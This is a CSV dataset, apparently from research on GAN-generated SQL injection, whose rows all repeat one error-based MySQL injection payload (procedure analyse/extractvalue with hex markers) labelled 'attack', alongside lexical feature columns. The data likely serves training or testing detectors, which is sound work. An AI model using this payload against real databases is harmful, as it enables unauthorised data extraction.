label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,814,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,815,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,816,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,817,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,818,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,819,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,820,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,821,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,822,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,823,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,824,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,825,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,826,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,827,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,828,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,829,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,830,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,831,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,832,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,833,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,834,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,835,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,836,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,837,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,838,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,839,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,840,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,841,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,842,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '",error,error,seqgan_improved,seqgan_improved__phase2b__error__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,843,195.0,31.0,3.9036306423259015,69.0,37.0,68.0,21.0,0.35384615384615387,0.18974358974358974,0.3487179487179487,0.1076923076923077,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
